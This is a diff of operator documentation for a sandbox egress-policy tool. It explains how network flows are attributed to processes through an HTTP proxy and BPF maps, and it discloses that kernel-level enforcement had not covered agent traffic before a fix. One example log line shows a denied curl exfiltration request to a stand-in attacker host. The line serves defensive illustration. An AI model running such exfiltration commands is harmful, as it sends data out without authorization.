@@ -67,21 +67,55 @@ to the process that made it:
 
 ```console
 $ km-netpolicy who evil.example.com
-14:05:02  deny     ebpf     evil.example.com  ← pid=4610 curl -s https://evil.example.com/exfil
+14:05:02  deny     http     evil.example.com  ← pid=4610 curl -s https://evil.example.com/exfil
 
 $ km-netpolicy who api.anthropic.com
-14:02:11  redirect ebpf     api.anthropic.com  ← pid=4299 curl -s https://api.anthropic.com/v1/messages
+14:02:11  allow    http     api.anthropic.com:443  ← pid=4299 curl -s https://api.anthropic.com/v1/messages
 ```
 
-**Attribution is narrower than "any flow" — it only ever works for a DENIED or
-REDIRECTED connection, on any enforcement mode.** `pkg/ebpf/bpf.c`'s
-`emit_event` fires only on `ACTION_DENY` and `ACTION_REDIRECT`; the connect4
-**allow** path deliberately emits no event at all (one event per allowed
-connection would be real CloudWatch volume), so there is no pid-bearing —
-often no flow at all — for an allowed connection. The DNS proxy, the HTTP
-proxy, and the eBPF resolver never record a pid on any verdict, allowed or
-not. So an **allowed** curl that succeeds is never attributable, even on a
-box already running `ebpf`/`both`:
+**Attribution comes from the HTTP proxy, not the eBPF ring buffer.** The
+sandbox user's `HTTPS_PROXY` env var sends nearly all agent egress to the
+proxy explicitly, over loopback — by the time that connection reaches the
+kernel's `connect4` program it is already a loopback hop to `127.0.0.1`
+carrying no destination worth recording, and `connect4` emits nothing for it
+at all. The proxy is the component that actually terminates the agent's
+connection, so it is the one that has to resolve the pid:
+`sidecars/http-proxy/httpproxy/pidresolve.go` walks two pinned BPF maps in
+the direction opposite `transparent.go`'s original-destination lookup — the
+connection's local TCP source port through `src_port_to_sock` (port → socket
+cookie, populated by the `sockops` program on every accepted connection),
+then `socket_pid_map` (cookie → pid, populated by `connect4` on **every**
+invocation, before any allow/deny decision is even made) — and `recordFlow`
+(the single chokepoint in `proxy.go`) stamps the result onto every flow
+record it writes. That happens **regardless of verdict**: an allowed
+connection through the proxy is now just as attributable as a denied or
+redirected one, which is a real loosening of how this used to work.
+
+**This needs the eBPF programs loaded — `spec.network.enforcement: ebpf` or
+`both`.** `km-http-proxy` itself runs under all three enforcement modes, but
+the two pinned maps it reads only exist once `km-ebpf-enforcer` has started
+and pinned them. Under `proxy` — the schema default — there is no BPF loaded
+at all, so there is nothing to resolve against and every flow the proxy
+records carries no pid, unconditionally.
+
+**Resolution fails soft everywhere, on purpose.** An absent pin directory
+(proxy-only enforcement, or the enforcer hasn't started yet), a map miss, or
+any lookup error all resolve to "no pid" — never a blocked request, never a
+dropped flow record. A load failure logs once per process lifetime, not once
+per connection (`http_proxy_pid_resolution_unavailable` in the http-proxy
+journal — a box running pure `proxy` enforcement would otherwise log it
+forever).
+
+**One case is still exactly as narrow as it always was: traffic that never
+reaches the proxy at all.** Something that opens a raw socket instead of
+respecting `HTTPS_PROXY` is seen only by the eBPF ring buffer, and
+`pkg/ebpf/bpf.c`'s `emit_event` fires only on `ACTION_DENY`/`ACTION_REDIRECT`
+— the `connect4` **allow** path deliberately emits no event at all (one event
+per allowed connection is real CloudWatch volume). So a non-proxied allowed
+connection still produces no flow record whatsoever, pid or otherwise. That
+is the one piece of the original "allow is never attributable" limitation
+that is still literally true — it just no longer describes proxied traffic,
+which is nearly everything an agent does:
 
 ```console
 $ km-netpolicy who api.github.com
@@ -96,16 +130,14 @@ is expected, not a sign the feature is broken. The exec trace itself
 is complete regardless — see `km-netpolicy execs`.
 ```
 
-This is the same shape of honesty as Phase 131's `transparent.go` gap: the
-capability has a hole, and the tool names it instead of hiding it behind
-silence. `proxy` enforcement (the schema default) never carries a pid on
-*any* flow, so `who` is empty there unconditionally — that gap was accepted
-by the operator on 2026-08-29 on the grounds that `proxy` is effectively the
-Docker-substrate path, which is not in use. But even on `ebpf`/`both`, where
-`who` is otherwise live, the narrowing above still applies: attribution
-exists only for the deny/redirect subset of traffic, never for what got
-through cleanly. The exec trace itself (`execs`) is complete in **every**
-enforcement mode; only the correlation is this narrow.
+That printed explanation predates the proxy-side fix and still only names the
+deny/redirect narrowing — even on a box where the real cause is `proxy`
+enforcement having no BPF pins at all. Both produce the identical empty
+result, but the message names only one of the two causes; if you're staring
+at it on a `proxy`-enforcement box, the mechanism above still applies, there
+are simply zero pins to resolve against. `src=resolver` and `src=dns` rows
+never carry a pid either way — those two producers observe a name, never a
+socket.
 
 Attribution can also come back partial for a genuinely pid-bearing flow — one
 with no matching exec record (rotation discarded it, or the pid's lifetime
@@ -115,6 +147,14 @@ rather than being silently dropped from the listing:
 ```
 14:07:02  deny     ebpf     140.82.113.6:443  ← (no exec recorded for that pid)
 ```
+
+**Historical note on the numbers themselves:** every `src=ebpf` row recorded
+before 2026-08-30 carried a byte-reversed destination IP, and (for
+`connect4`-layer events specifically — deny/redirect) a byte-reversed port
+too — a `curl https://github.com/` could show up as `3.114.82.140:47873`
+instead of `140.82.114.3:443`. Fixed in `d36a727b`; see
+`docs/egress-census.md` for the full correction and where else it landed.
+Treat any `src=ebpf` address/port pair from before that fix as unreliable.
 
 ### `execs save`
 
@@ -149,6 +189,48 @@ Repeat saves accumulate under `execs/{sandbox_id}/` rather than overwrite, one
 timestamped object per save — an earlier save may hold records that rotation
 has since discarded from the live file, so overwriting it would be a genuine
 loss.
+
+## A behavior change every operator upgrading needs to know about
+
+This surfaced while getting `who` to work at all, but it is bigger than exec
+capture and it is not something to bury in a changelog.
+
+cgroup v2 only lets a process migrate itself into a cgroup if it can write the
+**common ancestor's** `cgroup.procs`, which is root-owned. Every site that
+dispatched an agent turn as the sandbox user did it with `sudo -u sandbox
+bash -lc ...`, which lands in `user.slice/…/session-*.scope`, never
+`km.slice/km-<id>.scope`. Joining the cgroup *before* the `sudo` doesn't help
+either — PAM/logind's session integration migrates the process straight back
+out the moment the login session opens. The self-migration these sites
+attempted had been failing on every dispatch, silently, behind a
+`2>/dev/null || true`.
+
+**The consequence: the eBPF `connect4`/`sendmsg4`/`sockops`/`egress`
+programs — the kernel-level enforcement layer — had never run for agent
+traffic.** Only an interactive `km shell` session (which joins the cgroup
+through `km-session-entry` → `km-sandbox-shell`, not `sudo`) was ever actually
+inside it. Every Slack/GitHub/HackerOne/Webhook inbound-poller dispatch and
+every `km agent run` / `km at agent run` turn (`km-queue-runner`) ran entirely
+outside the enforcement cgroup, for as long as `enforcement: ebpf`/`both`
+sandboxes have existed. What actually enforced a profile's allowlist for that
+traffic was the DNS resolver (NXDOMAIN, and neither uid- nor cgroup-scoped)
+and the HTTP proxy (a plain userspace proxy that applies its allowlist to
+every connection it accepts, regardless of which cgroup the connecting
+process sits in) — never the BPF layer itself.
+
+Fixed in `0825b8ed` at all 15 dispatch sites, by joining the cgroup as root in
+a forked subshell and dropping privileges with `runuser` rather than
+`sudo`/`su` — `runuser` never opens a PAM/logind session, so the join
+survives.
+
+**This switches BPF enforcement on for agent traffic for the first time.** If
+a profile's `allowedDNSSuffixes`/`allowedHosts` were subtly too loose — loose
+enough that the DNS resolver and HTTP proxy never caught it, but that the BPF
+allow-trie would have — that gap was invisible before this release, and it is
+not invisible now. Say this plainly: a box that "worked fine" under
+`ebpf`/`both` may behave differently the next time it's recreated, because
+for the first time the eBPF layer is actually looking at what an agent does,
+not just what a human typed at an interactive prompt.
 
 ## Why its own daemon, not the eBPF enforcer
 
@@ -247,7 +329,18 @@ remember to run `execs save` by hand.
 on a graceful stop; nothing here is a durability guarantee for a killed
 instance or a kernel panic, and the docs are not going to imply one that
 doesn't hold. If you need the current trace preserved *now*, run
-`km-netpolicy execs save` yourself.
+`km-netpolicy execs save` yourself — see the known gap below on doing that
+by hand from an interactive shell.
+
+**Known gap: a manually-invoked `execs save` has no environment.** The
+`km-execlog.service` unit's own `Environment=` lines are what give
+`ExecStopPost` its `AWS_REGION`/`KM_ARTIFACTS_BUCKET`/`KM_SANDBOX_ID` —
+`/etc/km/netpolicy.env`, which `km shell --root` sources, carries none of
+them. Running `km-netpolicy execs save` by hand today fails with
+`KM_ARTIFACTS_BUCKET is not set`. Until that's plumbed through, the reliable
+way to force a save right now is `sudo systemctl restart km-execlog` (the
+outgoing process's `ExecStopPost` saves under the unit's own environment
+before the new one starts) rather than invoking the verb directly.
 
 ## Not tamper-proof, deliberately
 
@@ -310,16 +403,20 @@ box.
   store failed silently under a permissions bug and nobody noticed for a
   full phase). If that log line is absent, the daemon has never failed a
   write and the trace genuinely is what it says it is.
-- **`who <host>` says it can't attribute anything** — read the message it
-  prints. It distinguishes three different situations rather than collapsing
-  them into silence: the box is on `proxy` enforcement, where no flow ever
-  carries a pid; the flows it found were all **allowed**, and an allowed
-  connection never carries a pid on any enforcement mode (only a denied or
-  redirected one does — see `who <host>` above); or specific flows have a
-  pid but no matching exec record (pid-lifetime window miss, or rotation
-  discarded it). Those are three different problems with three different
-  fixes — running `ebpf`/`both` does not, by itself, make an allowed
-  connection attributable.
+- **`who <host>` says it can't attribute anything** — there are three
+  distinct reasons this happens, and the printed message currently only
+  names one of them (see `who <host>` above for the full mechanism): the box
+  is on `proxy` enforcement, where the HTTP proxy's own pid resolver has no
+  BPF pins to resolve against and every flow carries no pid, regardless of
+  verdict; the flows it found never reached the HTTP proxy at all (a raw
+  socket that bypassed `HTTPS_PROXY`) and were **allowed** — the eBPF
+  ring-buffer path never emits an event for an allowed `connect4`, proxy or
+  no proxy; or specific flows have a pid but no matching exec record
+  (pid-lifetime window miss, or rotation discarded it). An **allowed**
+  connection that *did* go through the proxy on an `ebpf`/`both` box IS
+  attributable today — that's the whole point of the proxy-side fix — so if
+  `who` comes back empty for one, check which of the three reasons above
+  actually applies before assuming the feature doesn't work for allows.
 - **A kernel-side ring-buffer drop is invisible to this tool.** `cilium/ebpf`
   exposes no drop counter for `BPF_MAP_TYPE_RINGBUF`, so the tracer can only
   detect a **stalled consumer** (its own drain loop falling behind), logged
@@ -333,6 +430,12 @@ box.
   fails the AWS SDK with "Invalid region: region was not a valid DNS name",
   which reads as a bucket problem rather than a config one (the same trap
   `km-capture.service` hit and was fixed for in commit `216d4664`).
+- **`km-netpolicy execs save` run by hand exits `KM_ARTIFACTS_BUCKET is not
+  set`** — this is a currently-open gap, not a misconfiguration on your box.
+  The verb reads its S3 target straight from the environment, and that
+  environment only exists inside the `km-execlog.service` unit; an
+  interactive `km shell --root` session has none of it. `sudo systemctl
+  restart km-execlog` forces the same save through `ExecStopPost` instead.
 
 See `.planning/phases/132-exec-capture/132-UAT.md` for the full live-UAT
 record (VulnHunter vs. `defcon.run.34`) and
